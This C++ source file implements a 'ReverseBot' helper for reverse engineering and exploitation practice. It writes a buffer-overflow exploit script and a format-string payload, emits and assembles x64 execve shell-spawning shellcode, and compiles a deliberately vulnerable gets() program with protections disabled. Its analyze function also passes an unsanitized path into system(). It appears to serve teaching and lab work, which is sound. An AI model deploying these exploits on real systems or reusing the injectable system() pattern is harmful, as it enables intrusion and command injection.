#include "ReverseBot.h"
#include <iostream>
#include <sstream>
#include <cstdlib>
#include <fstream>

void ReverseBot::analyze(const std::string& binary_path, AnalysisType type) {
    std::string cmd;
    
    switch(type) {
        case AnalysisType::DISASM:
            cmd = "objdump -d " + binary_path;
            break;
        case AnalysisType::STRINGS:
            cmd = "strings " + binary_path;
            break;
        case AnalysisType::SYMBOLS:
            cmd = "nm -D " + binary_path;
            break;
        case AnalysisType::HEADERS:
            cmd = "readelf -h " + binary_path;
            break;
        case AnalysisType::CONTROL_FLOW:
            cmd = "objdump -d " + binary_path + " | grep -E '(call|jmp|ret)'";
            break;
    }
    
    system(cmd.c_str());
}

void ReverseBot::create_exploit(const std::string& vuln_type) {
    if (vuln_type == "buffer_overflow") {
        std::ofstream exploit("exploit.py");
        exploit << "import struct\n";
        exploit << "import sys\n\n";
        exploit << "# Buffer overflow exploit\n";
        exploit << "buf = b'A' * 140\n";
        exploit << "ret_addr = struct.pack('<Q', 0x401000)\n";
        exploit << "payload = buf + ret_addr\n";
        exploit << "sys.stdout.buffer.write(payload)\n";
        exploit.close();
    }
    else if (vuln_type == "format_string") {
        std::ofstream exploit("format_exploit.py");
        exploit << "# Format string exploit\n";
        exploit << "payload = b'%x.' * 20\n";
        exploit << "print(payload.decode())\n";
        exploit.close();
    }
}

void ReverseBot::generate_shellcode(Arch arch, const std::string& payload) {
    std::ofstream sc("shellcode.asm");
    
    if (arch == Arch::X64) {
        if (payload == "execve") {
            sc << ".section .text\n";
            sc << ".global _start\n";
            sc << "_start:\n";
            sc << "    xor %rax, %rax\n";
            sc << "    mov $59, %al\n";
            sc << "    xor %rdi, %rdi\n";
            sc << "    push %rdi\n";
            sc << "    mov $0x68732f2f6e69622f, %rbx\n";
            sc << "    push %rbx\n";
            sc << "    mov %rsp, %rdi\n";
            sc << "    xor %rsi, %rsi\n";
            sc << "    xor %rdx, %rdx\n";
            sc << "    syscall\n";
        }
    }
    sc.close();
    
    system("as -64 shellcode.asm -o shellcode.o");
    system("ld shellcode.o -o shellcode");
    system("objdump -d shellcode | grep -oP '\\t\\K[0-9a-f ]+' | tr -d ' \\n' | sed 's/../\\\\x&/g'");
}

void ReverseBot::patch_binary(uint64_t addr, const std::vector<uint8_t>& patch) {
    std::cout << "Patching at 0x" << std::hex << addr << std::endl;
    std::cout << "Use: dd if=patch.bin of=binary bs=1 seek=" << std::dec << addr << " conv=notrunc" << std::endl;
    
    std::ofstream patchfile("patch.bin", std::ios::binary);
    patchfile.write(reinterpret_cast<const char*>(patch.data()), patch.size());
    patchfile.close();
}

void ReverseBot::teach_concept(const std::string& concept) {
    if (concept == "stack_overflow") {
        std::cout << "Stack Buffer Overflow:\n";
        std::cout << "1. Find vulnerable function with gets(), strcpy(), etc.\n";
        std::cout << "2. Calculate offset to return address\n";
        std::cout << "3. Overwrite return address with shellcode location\n";
        std::cout << "4. Place shellcode in accessible memory\n";
        
        std::ofstream vuln("vuln.c");
        vuln << "#include <stdio.h>\n";
        vuln << "int main() {\n";
        vuln << "    char buf[64];\n";
        vuln << "    gets(buf);\n";
        vuln << "    return 0;\n";
        vuln << "}\n";
        vuln.close();
        
        system("gcc -fno-stack-protector -z execstack vuln.c -o vuln");
    }
    else if (concept == "rop_chain") {
        std::cout << "Return Oriented Programming:\n";
        std::cout << "1. Find gadgets ending in 'ret'\n";
        std::cout << "2. Chain gadgets to perform desired operations\n";
        std::cout << "3. Use ROPgadget tool: ROPgadget --binary binary\n";
    }
}

std::string ReverseBot::get_analysis_report() {
    return "Analysis complete. Check output files.";
}